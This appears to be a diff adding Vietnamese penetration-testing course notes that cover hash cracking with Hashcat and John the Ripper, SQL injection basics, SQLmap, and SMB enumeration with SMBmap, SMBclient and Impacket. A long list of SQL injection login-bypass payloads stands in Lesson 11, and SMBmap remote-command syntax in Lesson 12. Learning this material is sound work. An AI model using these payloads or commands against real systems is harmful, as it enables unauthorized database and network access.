@@ -419,7 +419,209 @@ Hash cat hỗ trợ 4 hình thức crack hash:
 * Hybrid (-a 6 và -a 7): Kết hợp cả Dictionary attack và Mask attack.
 
 **Một câu lệnh tấn công Hashcat cơ bản sẽ có cú pháp như sau:**
+```
+hashcat -a <tấn-công> -m <thuật-toán-hash> <file-chứa-hash-đầu-vào> <danh-sách hoặc chuỗi-ký-tự>
+Ví dụ: 
+hashcat -a 0 -m 0 file-chứa-hash file-danh-sách 
+```
 
+* -a: Số của hình thức tấn công:
+  * -a 0: Dictionary
+  * -a 1: Combination
+  * -a 3: Mask
+  * -a 6 và -a 7: Dictionary + Mask
+* -m: Số của thuật toán hash (bất cứ khi nào quên, bạn đều có thể tra cứu lại bằng lệnh hashcat –help). Trong ví dụ mình dùng -m 0 để chỉ thuật toán hash MD5.
+* File chứa hash đầu vào
+* File chứa danh sách nếu tấn công Dictionary hoặc chuỗi ký tự nếu tấn công Mask
+## John The Ripper
+Một công cụ khác cũng hay được sử dụng để crack hash là John The Ripper. Đây cũng là một công cụ trên giao diện dòng lệnh và cũng có thể được cài trên nhiều hệ điều hành khác nhau như MacOS, Windows và Linux
+
+ohn The Ripper được thiết kế rất dễ sử dụng và có tích hợp cả tính năng tự động nhận diện thuật toán hash, thế nên chúng ta không cần phải xác định thuật toán rồi mới crack giống như Hashcat. 
+
+Cú pháp của John The Ripper rất đơn giản như sau: ```john <file-chứa-hash>```
+
+Khi bạn sử dụng câu lệnh john như trên, John The Ripper sẽ chạy để tìm thuật toán hash, sau đó sẽ sử dụng danh sách mặc định của mình để crack hash. Quá trình này sẽ tốn rất nhiều thời gian so với khi bạn cung cấp cho John tên của thuật toán hash, nhưng trong trường hợp chúng ta không thể tìm được tên thuật toán hash thì đành phải chấp nhận.
+
+Khi biết kiểu hash ta dùng lệnh sau: ```john --format=<kiểu hash> <file chứa mã hash> --show```
+
+Sau vài giây, đoạn hash đã được crack xong. Nếu John The Ripper không hiện ra password đã crack thì bạn sử dụng lệnh sau: 
+
+```john --wordlist=/usr/share/wordlists/rockyou.txt --format=<kieu hash> <file chua hash> --show```
+
+# Bài 9: Giới thiệu lỗ hổng SQL Injection
+## Cơ sở dữ liệu trong hệ thống web application
+### Website vs web application
+Website là một trang mạng có chứa một nội dung cụ thể nào đó. Nội dung đó có thể được thể hiện dưới dạng văn bản, video, âm nhạc, hình ảnh, v.v. Khi một người dùng bình thường truy cập vào một website, tất cả những gì họ có thể làm chỉ là đọc nội dung được trình bày trên website đó mà thôi.
+
+Web application là một website nhưng được tích hợp nhiều tính năng hơn cho phép người dùng cuối ngoài việc được phép đọc nội dung được trình bày trên website ra, người dùng còn có thể tương tác với các nội dung ấy nữa.
+
+### Cơ sở dữ liệu (database)
+Bạn có thể liên tưởng cơ sở dữ liệu giống như một ngăn tủ chứa tài liệu, nơi tài liệu được phân loại theo chủ đề, theo tháng, theo năm và theo tên người phụ trách. Để khi bạn cần tìm một tài liệu nào đó, bạn sẽ có thể biết ngay tài liệu đó ở trong tập hồ sơ nào; việc còn lại của bạn chỉ đơn giản là lấy tập hồ sơ đó và tìm tài liệu mà bạn cần. 
+
+Cơ sở dữ liệu được sử dụng để lưu giữ một cách có hệ thống các thông tin quan trọng
+
+Nếu không có cơ sở dữ liệu để quản lý trong khi dữ liệu có quá nhiều, thông tin và nội dung của web application có khả năng sẽ được lưu trữ rải rác khắp nơi trong server hoặc dữ liệu được lưu trữ không có tổ chức và trình tự, dẫn đến việc truy xuất dữ liệu sẽ lâu và tốn kém tài nguyên hệ thống hơn
+
+Hai kiểu cơ sở dữ liệu phổ biến nhất đang được sử dụng hiện nay là SQL và noSQL
+### SQL
+SQL là tên của một dạng cơ sở dữ liệu, nhưng đồng thời cũng là tên của một ngôn ngữ dòng lệnh dùng để tương tác với các cơ sở dữ liệu được xây dựng dựa trên SQL như: MySQL, PostgreSQL, v.v
+
+Câu lệnh SQL cho phép chúng ta có thể tương tác với cơ sở dữ liệu một cách nhanh chóng và hiệu quả nhằm thực hiện các công việc như:
+
+* Tạo hoặc xóa dữ liệu
+* Truy xuất dữ liệu
+* Kiểm tra dữ liệu
+* Lấy dữ liệu
+* v.v
+
+## Giới thiệu lỗ hổng bảo mật SQL Injection
+###  Khái niệm SQL Injection
+Lỗ hổng bảo mật SQL Injection là lỗ hổng được phát hiện trên các cơ sở dữ liệu SQL. Lỗ hổng này cho phép các hackers lợi dụng những tính năng cho phép người dùng cung cấp thông tin để hệ thống xử lý nhằm mục đích chèn vào một đoạn ký tự nhất định nhằm làm thay đổi cách thức câu lệnh SQL hoạt động theo hướng có lợi cho hackers
+
+Hiểu một cách đơn giản nhất: SQL Injection là lỗ hổng bảo mật cho phép hackers toàn quyền truy cập và thay đổi cơ sở dữ liệu của hệ thống nạn nhân thông qua việc thay đổi câu lệnh SQL đang được hệ thống sử dụng. 
+### SQL và form đăng nhập account user
+Một trong những nơi phổ biến nhất trên một web application hay bị hacker tấn SQL Injection đó là form đăng nhập account user.
+### Cơ chế của lỗi SQL Injection
+Một khi đã hiểu được cơ chế hoạt động đằng sau form đăng nhập người dùng, hackers chỉ cần làm cách nào đó để khi thực thi câu lệnh SQL kết quả được trả về là giá trị 1
+# Bài 10: Demo hướng dẫn khai thác lỗ hổng SQL Injection và giới thiệu công cụ SQL Map
+## Demo khai thác và cách nhận biết lỗ hổng SQL Injection
+## Công cụ SQLmap 
+Tất cả những ví dụ về SQL Injection mà ta đã học ở bài trước và phần 1 của bài này đều là những cách thức cơ bản và đơn giản nhất để khai thác lỗ hổng SQL Injection. Trong thực tế, lỗ hổng SQL Injection có 3 dạng khác nhau:
+
+* In-band SQL Injection
+* Inferential (Blind) SQL Injection
+* Out-of-band SQL Injection
+
+chúng ta sẽ cần một công cụ được thiết kế chuyên cho việc khai thác lỗ hổng SQL Injection từ cơ bản đến nâng cao. Công cụ ấy có tên là SQLmap.
+SQLmap là một công cụ trên giao diện dòng lệnh. SQLmap là một công cụ mã nguồn mở và miễn phí được tích hợp sẵn vào Kali Linux nhằm mục đích tự động phát hiện và khai thác lỗ hổng SQL Injection dựa vào URL form đăng nhập được cung cấp bởi người dùng.
+### Cách sử dụng SQLmap
+Cú pháp một câu lệnh của SQLmap như sau: ```sqlmap -u "url-mục-tiêu?form-parameter"``` ngài ra còn có rất nhiều flag có thể xem ở man
+
+Trong câu lệnh trên, flag -u dùng để cho biết URL của form đăng nhập mà bạn muốn tấn công SQL Injection. Đây là flag bắt buộc phải có khi dùng công cụ SQLmap. 
+
+Khi chạy câu lệnh trên, SQLmap sẽ tự động kiểm tra xem mục tiêu có dính lỗi SQL Injection hay không? Đồng thời, trong nhiều trường hợp, nó sẽ cung cấp một vài thông tin khá hữu ích như:
+
+* Tên hệ điều hành
+* Tên và version của cơ sở dữ liệu SQL
+* Tên web server
+* v.v
+# Bài 11: Thực hành khai thác lỗi SQL Injection thông qua SQLmap
+## SQLmap
+## Khác thác lỗ hổng SQL Injection theo cách thủ công
+Khi pentest hoặc học pentest, sẽ có những trường hợp bạn không thể sử dụng SQLmap để khai thác lỗ hổng SQL Injection được. Lí do thì có rất nhiều, có thể hệ thống mục tiêu được thiết lập tường lửa chặn bruteforce hoặc có chức năng giới hạn số request có thể được xử lý. 
+
+Một vài payload test SQLi
+```
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin" or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc
+```
+# Bài 12: Giao thức SMB và cách khai thác lỗi dựa vào SMBmap và SMBclient; giới thiệu impacket và những tài liệu tự học privilege escalation
+## Giao thức SMB là gì?
+SMB, viết tắt của Server Message Block Protocol, là một giao thức theo dạng server-client. Có nghĩa là server sẽ là máy chủ cung cấp dịch vụ và client sẽ là thiết bị cá nhân có nhu cầu sử dụng dịch vụ. 
+
+Giao thức SMB được sử dụng cho các mục đích như truy cập dữ liệu, file, ảnh, nhạc, máy in được kết nối bên trong mạng và những tài nguyên khác được lưu trữ bên trong mạng. Các SMB servers sẽ là nơi lưu trữ các tài nguyên, và các máy clients khi cần sử dụng những tài nguyên này sẽ truy cập vào các SMB servers.
+
+Giao thức SMB còn được biết tới như là một giao thức response-request (phản hồi-truy vấn). Nghĩa là SMB servers và SMB clients sẽ gửi nhiều gói tin qua lại với nhau để thiết lập một kết nối TCP. 
+
+Sau khi kết nối thành công đến SMB server, các clients sẽ tương tác với servers thông qua các câu lệnh
+
+Với SMB, tất cả các tài nguyên cho phép SMB clients truy cập sẽ được lưu trữ trong một directory. Khi SMB clients truy cập vào SMB servers, họ sẽ truy cập vào directory chứa các tài liệu được chia sẻ. Tùy vào phân quyền được cấp, phần lớn trường hợp những SMB clients có phân quyền thấp sẽ chỉ được phép đọc dữ liệu được lưu trữ bên trong directory mà thôi, chứ không được phép xóa, chỉnh sửa, thay đổi, nội dung được lưu trữ bên trong directory SMB. Ngoài ra, trong một số trường hợp SMB clients còn được cấp quyền thực thi câu lệnh bên trong SMB server. 
+## SMBmap
+Samba là một phiên bản mở rộng, mã nguồn mở của giao thức SMB, cho phép giao thức SMB có thể chạy trên những hệ thống Linux. 
+
+SMBmap là một công cụ trên giao diện dòng lệnh, dù để thu thập thông tin và được sử dụng hướng đến các hệ thống chạy Samba. SMBmap hoàn toàn miễn phí và được tích hợp sẵn vào hệ điều hành Kali Linux. SMBmap cho phép pentesters có thể tìm các share drives trong hệ thống mạng của mục tiêu (cách gọi khác của các directories trên SMB servers chứa tài nguyên dùng để chia sẻ cho SMB clients), phân quyền của share drives đó, những nội dung nào được chia sẻ, thực thi câu lệnh từ xa, v.v 
+
+Nói cách khác, SMBmap có thể được sử dụng để tìm những dữ liệu nhạy cảm được lưu giữ trong các SMB servers và được share rộng rãi với các SMBclients. 
+
+Để tìm tất cả các share drives có trong mạng của mục tiêu, chúng ta sẽ sử dụng câu lệnh sau: ```smbmap -H <địa-chỉ-ip>```
+
+Trong trường hợp chúng ta biết được username và password được dùng để truy cập vào tài nguyên được lưu trữ bên trong SMBserver, account này cũng cho phép người đăng nhập có thể thực thi câu lệnh. Vậy chúng ta sẽ sử dụng câu lệnh sau:
+
+```smbmap -u "<username>" -p "<password>" -H <IP-mục-tiêu> -x "<câu-lệnh-cần-chạy>"```
+## SMBclient
+Bên cạnh SMBmap, chúng ta còn có thể sử dụng SMBclient để truy cập vào những tài nguyên bên trong của một SMB server. SMBclient cũng là một công cụ dòng lệnh miễn phí và được tích hợp sẵn vào Kali Linux.
+
+Get cho phép bạn download file từ SMBserver về máy Kali. Cú pháp như sau: ```get <tên-file-cần-download>```
+
+Put cho phép bạn upload file từ máy Kali lên SMBserver. Cú pháp như sau: ```put <tên-file-cần-upload>```
+
+## Impacket
+mpacket là một tập hợp những đoạn scripts được viết bằng ngôn ngữ Python và được sử dụng để tấn công những giao thức mạng phổ biến được sử dụng trên hệ điều hành Windows. Những đoạn scripts này cho phép pentesters có thể thu thập thông tin người dùng, lấy hashes, leo thang đặc quyền, v.v
 
 
 
